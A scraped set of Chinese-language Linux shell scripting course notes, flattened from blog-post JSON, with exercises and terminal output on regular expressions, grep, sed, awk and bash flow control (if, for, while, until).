非打印字符非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：123456789字符 描述\\cx 匹配由x指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 &apos;c&apos; 字符。\\f 匹配一个换页符。等价于 \\x0c 和 \\cL。\\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。\\r 匹配一个回车符。等价于 \\x0d 和 \\cM。\\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。\\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。\\t 匹配一个制表符。等价于 \\x09 和 \\cI。\\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK 常见的正则表达式12345678910111213^ 行首定位符$ 行尾定位符. 匹配除换行符之外的单个字符* 匹配 0 个或多个前一字符? 匹配 0 个或1个前一字符+ 匹配 1 个或多个前一个字符[ ] 匹配指定字符组内的任一字符[^] 匹配不在指定字符组内的任一字符\\&lt; 单词起始边界匹配符\\&gt; 单词结束边界匹配符x\\{m\\} 连续 M 个字符 Xx\\{m,\\} 至少 M 个字符 Xx\\{m,n\\}至少 M 个最多 N 个字符 X 课堂练习 写一个测试脚本re.sh;带位置参数执行，例如 re.sh ab 代表以a开头的1234567#!/bin/bashif [[ $1 =~ ^a ]]then echo okelse echo nofi 测试：123456[root@rhel6 ~]# bash re.sh aok[root@rhel6 ~]# bash re.sh bno[root@rhel6 ~]# bash re.sh abok 代表以a结尾的1234567#!/bin/bashif [[ $1 =~ a$ ]]then echo okelse echo nofi测试：123456789[root@rhel6 ~]# vim re.sh[root@rhel6 ~]# bash re.sh aok[root@rhel6 ~]# bash re.sh bno[root@rhel6 ~]# bash re.sh abno[root@rhel6 ~]# bash re.sh baok 代表a字符后面一定有两个字符1234567#!/bin/bashif [[ $1 =~ a.. ]]then echo okelse echo nofi测试：123456789[root@rhel6 ~]# vim re.sh[root@rhel6 ~]# bash re.sh ano[root@rhel6 ~]# bash re.sh axxok[root@rhel6 ~]# bash re.sh baxxok[root@rhel6 ~]# bash re.sh baxxxok 代表匹配a字符后面可以是0个b，也可以是多个b1234567#!/bin/bashif [[ $1 =~ ab* ]]then echo okelse echo nofi测试：123456789101112[root@rhel6 ~]# bash re.sh aok[root@rhel6 ~]# bash re.sh abok[root@rhel6 ~]# bash re.sh abbbbok[root@rhel6 ~]# bash re.sh abbbbxxxok[root@rhel6 ~]# bash re.sh acccok[root@rhel6 ~]# bash re.sh cccno 匹配 0 个或1个前一字符1234567#!/bin/bashif [[ $1 =~ 1a?1 ]]then echo okelse echo nofi测试：123456[root@rhel6 ~]# bash re.sh 11ok[root@rhel6 ~]# bash re.sh 1a1ok[root@rhel6 ~]# bash re.sh 1aa1no 代表匹配a字符后面可以是1个b，也可以是多个b1234567#!/bin/bashif [[ $1 =~ ab+ ]]then echo okelse echo nofi测试：12345678[root@rhel6 ~]# bash re.sh ano[root@rhel6 ~]# bash re.sh abok[root@rhel6 ~]# bash re.sh abbbok[root@rhel6 ~]# bash re.sh acno 代表匹配ab字符，后面可以是任意字符1234567#!/bin/bashif [[ $1 =~ ab.* ]]then echo okelse echo nofi测试：1234567891011[root@rhel6 ~]# vim re.sh[root@rhel6 ~]# bash re.sh ano[root@rhel6 ~]# bash re.sh abok[root@rhel6 ~]# bash re.sh abbbbok[root@rhel6 ~]# bash re.sh acccno[root@rhel6 ~]# bash re.sh cccno 代表匹配a和b字符之间可以是任意字符1234567#!/bin/bashif [[ $1 =~ a.*b ]]then echo okelse echo nofi测试：12345678910[root@rhel6 ~]# bash re.sh ano[root@rhel6 ~]# bash re.sh bno[root@rhel6 ~]# bash re.sh abok[root@rhel6 ~]# bash re.sh a1bok[root@rhel6 ~]# bash re.sh 1a1b1ok 代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符1234567#!/bin/bashif [[ $1 =~ [Bb]ooboo ]]then echo okelse echo nofi测试：123456[root@rhel6 ~]# bash re.sh booboook[root@rhel6 ~]# bash re.sh Booboook[root@rhel6 ~]# bash re.sh cooboono 代表匹配不在指定字符组内的任一字符1234567#!/bin/bashif [[ $1 =~ [^Bb]ooboo ]]then echo okelse echo nofi测试：123456[root@rhel6 ~]# bash re.sh booboono[root@rhel6 ~]# bash re.sh Booboono[root@rhel6 ~]# bash re.sh cooboook 单词起始和结束边界匹配符与行首行尾的匹配对比1234567891011121314151617181920212223242526[root@rhel6 ~]# vim re.filebooboo tom jackjack tom boobootom tom tomjack jackjack[root@rhel6 ~]# grep &quot;^booboo&quot; re.filebooboo tom jack[root@rhel6 ~]# grep &quot;\\&lt;booboo&quot; re.filebooboo tom jackjack tom booboo[root@rhel6 ~]# grep &quot;\\&gt;booboo&quot; re.file[root@rhel6 ~]# grep &quot;\\&gt;jack&quot; re.file[root@rhel6 ~]# grep &quot;jack$&quot; re.filebooboo tom jackjack jackjack[root@rhel6 ~]# grep &quot;jack\\&gt;&quot; re.filebooboo tom jackjack tom booboojack jackjack 某个字符数量限定 x{m}连续 M 个字符 X x{3} =3 x{m,} 至少 M 个字符 Xx{3,} &gt;=3 x{m,n} 至少 M 个最多 N 个字符 X x{3,4} &gt;=3 &lt;=4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[root@rhel6 ~]# vim re.filebooboo tom jackjack tom boobootom tom tomjack jackjackf fo foo fooo foooo[root@rhel6 ~]# grep &quot;o\\{0\\}&quot; re.filebooboo tom jackjack tom boobootom tom tomjack jackjackboooboof fo foo fooo foooo[root@rhel6 ~]# grep &quot;o\\{1\\}&quot; re.filebooboo tom jackjack tom boobootom tom tomboooboof fo foo fooo foooo[root@rhel6 ~]# grep &quot;o\\{4\\}&quot; re.filef fo foo fooo foooo#!/bin/bashif [[ $1 =~ o{2,3}$ ]]then echo okelse echo nofi[root@rhel6 ~]# bash re.sh foook[root@rhel6 ~]# bash re.sh fooook[root@rhel6 ~]# bash re.sh fooofno[root@rhel6 ~]# bash re.sh foofno [:digit:]代表数字而已 , 0-9123456789101112131415[root@rhel6 ~]# cat re.file145aasdfsdf4444[root@rhel6 ~]# grep &quot;[[:digit:]]&quot; re.file145aa4444[root@rhel6 ~]# grep &quot;^[[:digit:]]&quot; re.file145aa4444[root@rhel6 ~]# grep &quot;[^[:digit:]]&quot; re.file145aasdfsdf[root@rhel6 ~]# grep &quot;^[^[:digit:]]&quot; re.file1sdfsdf 课堂作业 1.说出下面匹配的内容123456789101112#!/bin/bash#^a 以a开头#b? b的个数0或者1#c+ c的个数&gt;=1#d.*e d和e之间可以是任意字符#f$ 以f结尾if [[ $1 =~ ^ab?c+d.*ef$ ]]then echo okelse echo nofi 课后作业 1.if判断匹配ip地址 2.if判断匹配邮件地址格式为9aA@9aA.com 3.grep 过滤空白行 4.grep 过滤以空格开头的行 5.针对/usr/share/dict/words文件做过滤 1）列出文件中包含 先有字母t，然后中间有一个元音字母，之后是sh的单词； 2）列出文件中包含 先有字母t，然后中间有若干个元音字母，之后是sh的单词； 3）列出文件中刚好包含16个字母的单词。** 1234567891011121314151617181920212223242526#!/bin/bashif [[ $1 =~ ^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$ ]]then IP=(${1//\\./ }) [ ${IP[0]} -gt 0 -a ${IP[0]} -lt 255 ] &amp;&amp; [ ${IP[1]} -ge 0 -a ${IP[1]} -lt 255 ] &amp;&amp; [ ${IP[2]} -ge 0 -a ${IP[2]} -lt 255 ] &amp;&amp; [ ${IP[3]} -gt 0 -a ${IP[3]} -lt 255 ] &amp;&amp; echo ok || echo noelse echo &quot;this is not IPADDR!&quot;fi#!/bin/bashif [[ $1 =~ ^[0-9a-zA-Z]+@[0-9a-zA-Z]+\\.com$ ]]then echo okelse echo nofi[root@rhel6 ~]# grep &quot;^$&quot; re.file2grep &apos;^t[a-zA-Z]sh&apos; /usr/share/dict/wordsgrep &apos;^t[a-zA-Z]\\+sh&apos; /usr/share/dict/wordsgrep -E &apos;^[a-zA-Z0-9]{16}$&apos; /usr/share/dict/words grep &apos;^[a-zA-Z0-9]\\{16\\}$&apos; /usr/share/dict/words 晚自习作业 完成所有练习 帐号是否合法（字母开头，允许5-16位，只能包含字母数字下划线） 密码是否合法（字母开头，允许6-18位，只能包含字母数字下划线和！@#） 匹配日期2016-10-1112345678#!/bin/bash#if [[ $1 =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]]if [[ $1 =~ ^[0-9]{4}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[1-9]|3[01])$ ]]then echo okelse echo nofi","link":"/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/"},{"title":"LINUX Shell Scripts 第四课 Sed","text":"sed什么是sedsed( 意为流编辑器 , 源自英语 “ stream editor” 的缩写 ) 是 Unix 常见的命令行程序。 sed 用来把文档或字符串里面的文字经过一系列编辑命令转换为另一种格式输出。 sed 通常 用来匹配一个或多个正则表达式的文本进行处理。 分号 (;) 可以用作分隔命令的指示符。尽管 sed 脚本固有的很多限制 , 一连串的 sed 指令加起来可以编程像 仓 库番、快打砖块、甚至俄罗斯方块等电脑游戏的复杂程序。 如何使用sed语法模式• 命令行模式• 脚本模式 命令行模式 sed 流编辑器 针对行进行操作的 sed命令的原理123456读文件---一行一行读存入缓存空间匹配行---是---动作--继续读取 ---不是------ 继续读取 读到最后一行为止输出 sed命令的用法 sed [-options] ‘[cmd]’ filename sed [-options] ‘[哪些行][干什么]’ filename 123456789101112131415161718192021222324252627282930313233343536373839cmd 操作定位（哪一行） 1 第一行 2,3 从第二行到第三行 $ 最后一行 正则表达式 /^root/ 以root开头的行 /bin$/ 以bin结尾的行 1. 十进制数字 2. 正则表达式 3. 逗号分隔符 4. 组合方式 5. 特殊方式 函数（干什么） p 打印，输出到屏幕上 d 删除 s 替换 sed &apos;/^#/s/\\/\\*.*\\*\\///&apos; file a 当前行的行后，添加一行 sed &apos;1ahello word&apos; file i 当前行的行前，添加一行 sed &apos;1ihello word&apos; file参数options -n 不输出所有的行 -i 直接修改目标文件 -e 连接多个cmd简单控制流1. ! 命令取反 例如:sed &apos;/kevin/!d&apos; file 删除不包含字符串”kevin“的行2. { } 组合多个命令组合命令作为一个整体被执行,函数命令之间用” ; “分隔,组合命令可以嵌套。例如:sed &apos;/kevin/{s/1/2/; /3/d}&apos; file。3. n 读取下一输入行,从下一条命令而非第一条命令开始操作例如:sed &apos;/kevin/{n; d}&apos; file删除带字符串”kevin“行的下一行 课堂练习 下载mysqlbinlog.row文件 打印第三行 打印1到5行 打印最后一行 打印30到最后一行 打印包含“BEGIN”的行 打印包含“COMMIT”的行 打印以“###”开头的行 删除每一行的“### ” 删除所有“/到/” 将“DELETE FROM”替换为“insert into” 将“INSERT INTO”替换为“delete from” 将“SET”替换为“where” 将“WHERE”替换为“set” 将“@1”替换为“id” 将“@2”替换为“name” 12345678[root@client0 ~]# sed &apos;3p&apos; mysqlbinlog.row[root@client0 ~]# sed -n &apos;3p&apos; mysqlbinlog.row[root@client0 ~]# sed -n &apos;1,5p&apos; mysqlbinlog.row[root@client0 ~]# sed -n &apos;$p&apos; mysqlbinlog.row[root@client0 ~]# sed -n &apos;30,$p&apos; mysqlbinlog.row[root@client0 ~]# sed -n &apos;/BEGIN/p&apos; mysqlbinlog.row[root@client0 ~]# sed -n &apos;/COMMIT/p&apos; mysqlbinlog.row[root@client0 ~]# sed &apos;{s/### //;s@\\/\\*.*\\*\\/@@;s/DELETE FROM/insert into/;s/INSERT INTO/delete from/;s/SET/where/;s/WHERE/set/;s/@1/id/;s/@2/name/}&apos; mysqlbinlog.row 课堂练习 将192.168.1.1替换成192.168.2.2 将192.168.1.1替换成192.188.5.1 将192.168.1.1替换成192.192.192.1 将hello,babay中babay后面追加”,mybabay” 将hello,babay中hello后面追加”,mybabay” 将hello,babay替换为”hello1hello2hello3,babay” 将/tmp/shadow的内容追加到/tmp/passwd中以root开头的行的后面 将/tmp/passwd中以root开头的行和后面的2行写入/tmp/shadow 1234567891011121314151617[root@client0 ~]# echo 192.168.1.1|sed &apos;s/\\(.*\\)1.1/\\12.2/&apos;192.168.2.2[root@client0 ~]# echo 192.168.1.1|sed &apos;s/\\(.*\\)168.1\\(.*\\)/\\1188.5\\2/&apos;192.188.5.1[root@client0 ~]# echo 192.168.1.1|sed &apos;s/\\(.*\\)168.1\\(.*\\)/\\1\\1\\11/&apos;192.192.192.1[root@client0 ~]# echo hello,babay|sed &apos;s/babay/&amp;,mybabay/&apos;hello,babay,mybabay[root@client0 ~]# echo hello,babay|sed &apos;s/hello/&amp;,mybabay/&apos;hello,mybabay,babay[root@client0 ~]# echo hello,babay|sed &apos;s/hello/&amp;1&amp;2&amp;3/&apos;hello1hello2hello3,babay[root@client0 ~]# sed &apos;/^root/r /tmp/shadow&apos; /tmp/passwd[root@client0 ~]# sed &apos;/^root/,+2w /tmp/shadow&apos; /tmp/passwd 课后习题1. 将selinux设置成开机关闭状态。用sed完成 2. 设置当前用户的umask值永久生效为033 ~/.bashrc。用sed完成 3. 用脚本实现自动化搭建DNS服务器，并自动化配置解析，自动化测试。awk简介awk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。 awk有3个不同版本: awk、nawk和gawk，未作特别说明，一般指gawk，gawk 是 AWK 的 GNU 版本。 awk其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母。实际上 AWK 的确拥有自己的语言： AWK 程序设计语言 ， 三位创建者已将它正式定义为“样式扫描和处理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。 使用方法awk ‘{pattern + action}’ {filenames} 尽管操作可能会很复杂，但语法总是这样，其中 pattern 表示 AWK 在数据中查找的内容，而 action 是在找到匹配内容时所执行的一系列命令。花括号（{}）不需要在程序中始终出现，但它们用于根据特定的模式对一系列指令进行分组。 pattern就是要表示的正则表达式，用斜杠括起来。 awk语言的最基本功能是在文件或者字符串中基于指定规则浏览和抽取信息，awk抽取信息后，才能进行其他文本操作。完整的awk脚本通常用来格式化文本文件中的信息。 通常，awk是以文件的一行为处理单位的。awk每接收文件的一行，然后执行相应的命令，来处理文本。 调用awk有三种方式调用awk 命令行方式awk [-F field-separator] ‘commands’ input-file(s) 其中，commands 是真正awk命令，[-F域分隔符]是可选的。 input-file(s) 是待处理的文件。 在awk中，文件的每一行中，由域分隔符分开的每一项称为一个域。通常，在不指名-F域分隔符的情况下，默认的域分隔符是空格。 shell脚本方式 将所有的awk命令插入一个文件，并使awk程序可执行，然后awk命令解释器作为脚本的首行，一遍通过键入脚本名称来调用。 相当于shell脚本首行的：#!/bin/sh 可以换成：#!/bin/awk 将所有的awk命令插入一个单独文件，然后调用：awk -f awk-script-file input-file(s) 其中，-f选项加载awk-script-file中的awk脚本，input-file(s)跟上面的是一样的。 本章重点介绍命令行方式。 入门实例假设last -n 5的输出如下 123456[root@www ~]# last -n 5 &lt;==仅取出前五行root pts/1 192.168.1.100 Tue Feb 10 11:21 still logged inroot pts/1 192.168.1.100 Tue Feb 10 00:46 - 02:28 (01:41)root pts/1 192.168.1.100 Mon Feb 9 11:41 - 18:30 (06:48)dmtsai pts/1 192.168.1.100 Mon Feb 9 11:41 - 11:41 (00:00)root tty1 Fri Sep 5 14:09 - 14:10 (00:01)如果只是显示最近登录的5个帐号123456#last -n 5 | awk &apos;{print $1}&apos;rootrootrootdmtsairootawk工作流程是这样的：读入有’\\n’换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是”空白键” 或 “[tab]键”,所以$1表示登录用户，$3表示登录用户ip,以此类推。 如果只是显示/etc/passwd的账户12345#cat /etc/passwd |awk -F &apos;:&apos; &apos;{print $1}&apos; rootdaemonbinsys这种是awk+action的示例，每行都会执行action{print $1}。 -F指定域分隔符为’:’。 如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以tab键分割12345#cat /etc/passwd |awk -F &apos;:&apos; &apos;{print $1&quot;\\t&quot;$7}&apos;root /bin/bashdaemon /bin/shbin /bin/shsys /bin/sh 如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以逗号分割,而且在所有行添加列名name,shell,在最后一行添加”blue,/bin/nosh”。 12345678cat /etc/passwd |awk -F &apos;:&apos; &apos;BEGIN {print &quot;name,shell&quot;} {print $1&quot;,&quot;$7} END {print &quot;blue,/bin/nosh&quot;}&apos;name,shellroot,/bin/bashdaemon,/bin/shbin,/bin/shsys,/bin/sh....blue,/bin/nosh awk工作流程是这样的：先执行BEGING，然后读取文件，读入有/n换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域,随后开始执行模式所对应的动作action。接着开始读入第二条记录······直到所有的记录都读完，最后执行END操作。 搜索/etc/passwd有root关键字的所有行 12#awk -F: &apos;/root/&apos; /etc/passwdroot:x:0:0:root:/root:/bin/bash 这种是pattern的使用示例，匹配了pattern(这里是root)的行才会执行action(没有指定action，默认输出每行的内容)。 搜索支持正则，例如找root开头的: awk -F: ‘/^root/‘ /etc/passwd 搜索/etc/passwd有root关键字的所有行，并显示对应的shell 12# awk -F: &apos;/root/{print $7}&apos; /etc/passwd /bin/bash 这里指定了action{print $7} awk内置变量awk有许多内置变量用来设置环境信息，这些变量可以被改变，下面给出了最常用的一些变量。 1234567891011ARGC 命令行参数个数ARGV 命令行参数排列ENVIRON 支持队列中系统环境变量的使用FILENAME awk浏览的文件名FNR 浏览文件的记录数FS 设置输入域分隔符，等价于命令行 -F选项NF 浏览记录的域的个数NR 已读的记录数OFS 输出域分隔符ORS 输出记录分隔符RS 控制记录分隔符 此外,$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,……以此类推。 统计/etc/passwd:文件名，每行的行号，每行的列数，对应的完整行内容:12345#awk -F &apos;:&apos; &apos;{print &quot;filename:&quot; FILENAME &quot;,linenumber:&quot; NR &quot;,columns:&quot; NF &quot;,linecontent:&quot;$0}&apos; /etc/passwdfilename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/bashfilename:/etc/passwd,linenumber:2,columns:7,linecontent:daemon:x:1:1:daemon:/usr/sbin:/bin/shfilename:/etc/passwd,linenumber:3,columns:7,linecontent:bin:x:2:2:bin:/bin:/bin/shfilename:/etc/passwd,linenumber:4,columns:7,linecontent:sys:x:3:3:sys:/dev:/bin/sh 使用printf替代print,可以让代码更加简洁，易读1awk -F &apos;:&apos; &apos;{printf(&quot;filename:%10s,linenumber:%s,columns:%s,linecontent:%s\\n&quot;,FILENAME,NR,NF,$0)}&apos; /etc/passwd print和printfawk中同时提供了print和printf两种打印输出的函数。 其中print函数的参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。 printf函数，其用法和c语言中printf基本相似,可以格式化字符串,输出复杂时，printf更加好用，代码更易懂。 awk编程变量和赋值除了awk的内置变量，awk还可以自定义变量。 下面统计/etc/passwd的账户人数 1234awk &apos;{count++;print $0;} END{print &quot;user count is &quot;, count}&apos; /etc/passwdroot:x:0:0:root:/root:/bin/bash......user count is 40count是自定义变量。之前的action{}里都是只有一个print,其实print只是一个语句，而action{}可以有多个语句，以;号隔开。 这里没有初始化count，虽然默认是0，但是妥当的做法还是初始化为0: 12345awk &apos;BEGIN {count=0;print &quot;[start]user count is &quot;, count} {count=count+1;print $0;} END{print &quot;[end]user count is &quot;, count}&apos; /etc/passwd[start]user count is 0root:x:0:0:root:/root:/bin/bash...[end]user count is 40 统计某个文件夹下的文件占用的字节数 12ls -l |awk &apos;BEGIN {size=0;} {size=size+$5;} END{print &quot;[end]size is &quot;, size}&apos;[end]size is 8657198 如果以M为单位显示: 12ls -l |awk &apos;BEGIN {size=0;} {size=size+$5;} END{print &quot;[end]size is &quot;, size/1024/1024,&quot;M&quot;}&apos;[end]size is 8.25889 M 注意，统计不包括文件夹的子目录。 条件语句awk中的条件语句是从C语言中借鉴来的，见如下声明方式： 12345678910111213141516171819if (expression) { statement; statement; ... ...}if (expression) { statement;} else { statement2;}if (expression) { statement1;} else if (expression1) { statement2;} else { statement3;} 统计某个文件夹下的文件占用的字节数,过滤4096大小的文件(一般都是文件夹): 12ls -l |awk &apos;BEGIN {size=0;print &quot;[start]size is &quot;, size} {if($5!=4096){size=size+$5;}} END{print &quot;[end]size is &quot;, size/1024/1024,&quot;M&quot;}&apos;[end]size is 8.22339 M 循环语句awk中的循环语句同样借鉴于C语言，支持while、do/while、for、break、continue，这些关键字的语义和C语言中的语义完全相同。 数组因为awk中数组的下标可以是数字和字母，数组的下标通常被称为关键字(key)。值和关键字都存储在内部的一张针对key/value应用hash的表格里。由于hash不是顺序存储，因此在显示数组内容时会发现，它们并不是按照你预料的顺序显示出来的。数组和变量一样，都是在使用时自动创建的，awk也同样会自动判断其存储的是数字还是字符串。一般而言，awk中的数组用来从记录中收集信息，可以用于计算总和、统计单词以及跟踪模板被匹配的次数等等。 显示/etc/passwd的账户 12345678awk -F &apos;:&apos; &apos;BEGIN {count=0;} {name[count] = $1;count++;}; END{for (i = 0; i &lt; NR; i++) print i, name[i]}&apos; /etc/passwd0 root1 daemon2 bin3 sys4 sync5 games...... 这里使用for循环遍历数组 awk编程的内容极多，这里只罗列简单常用的用法，更多请参考 http://www.gnu.org/software/gawk/manual/gawk.html","link":"/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/"},{"title":"LINUX Shell Scripts 第二课 流程控制语句","text":"shell 的基本组成元素 1&gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。 2&gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行是注示。这些行不会被运行 , 只是给人阅读使用。 3&gt; 系统命令 :shell 脚本中运行解释的系统命令。 4&gt; 变量 : 脚本运行过程中某些反复调用的值的暂存地。 5&gt; 流程控制语句 : 判断 , 循环 , 跳转等流程控制。 执行脚本的方法 1&gt; bash 脚本名称 bash -x 以调试模式来运行脚本 2&gt; ./ 脚本名称 –&gt; 需要对脚本有可执行的权限 shell的基本语法 条件判断语句 if test 循环语句 for while unitl 其他流程控制 case continue break shift function 判断条件test 判断—————man test 查看的相关的判断指令 1234567 数字的判断 字符的判断 文件的判断-gt 大于 -z 空 -d 文件是不是一个目录-ge 大于等于 = 字符相等 -f 是不是一个普通文件-lt 小于 != 字符不相等 -e 文件是不是存在-le 小于等于 -n 非空 -ne 不等于 -a 逻辑与-eq 等于 -o 逻辑或 注意 ： * [ ] 括号两边有空格 * 判断符号两边有空格 if 语法格式123456789101112131415if condition --&gt;condition 指的是判断的条件then CMD1 --&gt; CMD1 指的是满足判断条件后执行的语句else CMD2 --&gt; CMD2 指的是不满足判断条件执行的语句 thenfiif conditionthen CMD1elif condition CMD2else CMD3fi 课堂练习1. 写一个脚本，判断用户是否存在，如果存在则删除。若不存在，就提示不存在。 2. 三个数字比大小，输出最大的 3. 三个数字比大小,并且按从大到小排列1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[#74#root@client0 ~]#cat usertest.sh#!/bin/bashread -p &quot;plz input username:&quot; userif id $user &amp;&gt; /dev/nullthen userdel -r $userelse echo &quot;student not exits&quot;fi[#75#root@client0 ~]#cat num.sh#!/bin/bashif [ $1 -gt $2 ]then if [ $1 -gt $3 ] then echo &quot;max is $1&quot; else echo &quot;max is $3&quot; fielse if [ $2 -gt $3 ] then echo &quot;max is $2&quot; else echo &quot;max is $3&quot; fifiecho ${#}[#76#root@client0 ~]#bash num.sh 9 8 80max is 803[#99#root@client0 ~]#cat sort.sh#!/bin/bashif [ $1 -ge $2 ]then n1=$1 n2=$2else n1=$2 n2=$1fiif [ $n1 -ge $3 ]then max=$n1 if [ $n2 -ge $3 ] then be=$n2 min=$3 else be=$3 min=$n2 fielse max=$3 be=$n1 min=$n2fiecho $max $be $min[#101#root@client0 ~]#bash sort.sh 3 8 18 3 1 for 语法格式1234for 变量 in 取值范围do CMDdone 取值范围 以空格分割 for i in 1 2 3 for i in 5 7 10 for i in a b c例子：12345678 for i in 10 11do ssh root@172.25.0.$i &quot;yum install -y wget&quot;donefor i in xx uudo ls /tmp/$idone 以{}罗列 {1..10}1234可以使用seq $(seq 1 10)==&gt;1 2 3 4 5 6 7 8 9 10 `seq 1 10` seq 1 2 10==&gt;1 3 5 7 9 seq 10 -1 1==&gt;10 9 8 7 6 5 4 3 2 1 命令行方式for i in {1..10};do echo $i;done课堂练习 统计当前系统一共有多少个用户，并且向每个用户问好，屏幕输出“hello $username,your uid is $uid” 依次向/var/目录下的每个文件问好“hello $file” ,统计一共有多少个文件 输入用户名，当前系统中属于该用户的所有文件都会打印在屏幕上，并且告诉你文件大小超过$size的文件有哪些 计算某个命令执行的时间 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293[root@client47 ~]# cat for1.sh#!/bin/bashecho 系统中一共有：`cat /etc/passwd |wc -l`个用户for i in `cut -d &quot;:&quot; -f 1 /etc/passwd 2&gt;/dev/null`do username=$i uid=`grep ^$i /etc/passwd |cut -d &quot;:&quot; -f 3 2&gt;/dev/null` echo &quot;hello $username,your uid is $uid&quot;done[root@client47 ~]# bash for1.sh系统中一共有：22个用户hello root,your uid is 0hello bin,your uid is 1hello daemon,your uid is 2hello adm,your uid is 3hello lp,your uid is 4hello sync,your uid is 5hello shutdown,your uid is 6hello halt,your uid is 7hello mail,your uid is 8hello operator,your uid is 11hello games,your uid is 12hello ftp,your uid is 14hello nobody,your uid is 99hello avahi-autoipd,your uid is 170hello systemd-bus-proxy,your uid is 999hello systemd-network,your uid is 998hello dbus,your uid is 81hello polkitd,your uid is 997hello tss,your uid is 59hello postfix,your uid is 89hello sshd,your uid is 74hello student,your uid is 1000[root@client47 ~]# cat for2.sh#!/bin/bashfor i in `ls /var/`do echo hello $idoneecho /var目录中一共有`ls -l /var/|wc -l`个文件[root@client47 ~]# bash for2.shhello admhello cachehello crashhello dbhello emptyhello gameshello gopherhello kerberoshello libhello localhello lockhello loghello mailhello nishello opthello preservehello runhello spoolhello tmphello yp/var目录中一共有21个文件[root@client47 ~]# cat for3.sh#!/bin/bashread -p &quot;请输入用户名：&quot; usernameread -p &quot;请输入文件SIZE的最大值：&quot; sizefind / -user $username -size +$size 2&gt;/dev/null[root@client47 ~]# bash for3.sh请输入用户名：root请输入文件SIZE的最大值：500M/proc/kcore[root@client47 ~]# bash for3.sh请输入用户名：root请输入文件SIZE的最大值：100M/proc/kcore/usr/lib/locale/locale-archive[root@client47 ~]# cat for4.sh#!/bin/bashread -p &quot;plz input CMD:&quot; cmdstart=`date +%s`$cmd &amp;&gt; /dev/nullend=`date +%s`time=$(($end-$start))echo $cmd 执行的时间为 $time[root@client47 ~]# bash for4.shplz input CMD:xz -d /tmp/big.xzxz -d /tmp/big.xz 执行的时间为 2 拓展题 画斜线正反1234* * * * 写一个9*9乘法表 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253[root@client0 ~]# cat x1.sh#!/bin/bash#行数 空格 *数量#1 0 1#2 1 1#3 2 1#n n-1 1for i in `seq 1 $1`do for j in `seq 1 $(($i-1))` do echo -n &apos; &apos; done echo &apos;*&apos;done[root@client0 ~]# bash x1.sh 4* * * *[root@client0 ~]# cat x2.sh#!/bin/bash#1*1=1#2*1=2 2*2=4#3*1=3 3*2 3*3#9*1 9*2 9*9=for i in `seq 1 9`do for j in `seq 1 $i` do echo -n &quot;$i*$j=$(($i*$j)) &quot; done echodone[root@client0 ~]# bash x2.sh1*1=12*1=2 2*2=43*1=3 3*2=6 3*3=94*1=4 4*2=8 4*3=12 4*4=165*1=5 5*2=10 5*3=15 5*4=20 5*5=256*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=367*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=498*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=649*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81 while 语法格式1234567891011 while condition 指的是判断的条件 do CMD done数字的判断 字符的判断 文件的判断 -gt 大于 -z 空 -d 文件是不是一个目录 -ge 大于等于 = 字符相等 -f 是不是一个普通文件 -lt 小于 != 字符不相等 -e 文件是不是存在 -le 小于等于 -n 非空 -ne 不等于 -a 逻辑与 -eq 等于 -o 逻辑或 当什么的时候就做什么,体验无限循环123456789101112#!/bin/bashtouch /tmp/whilefilewhile [ -f /tmp/whilefile ]do cat &gt;&gt; /tmp/whilefile &lt;&lt; ENDF当山峰没有棱角的时候当河水不再流。。。我哈哈ishiENDFdone 不满足条件跳出循环123456789判断/tmp/whilefile2是否存在，不存在的时候我们去创建#!/bin/bashwhile [ ! -e /tmp/whilefile2 ]do cat &gt; /tmp/whilefile2 &lt;&lt; ENDFhelloENDFdone until 语法格式1234until condition --&gt; 不满足 condition, 则执行 cmddo CMDdone 课堂练习1. 连乘算法 while和until 2. 要求根据userlist创建用户，要求指定用户名，用户id，用户的附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。 userlist文件的格式如下： carol 777 tom uplooking natasha 778 tom uplooking r1 779 tom uplooking 3. 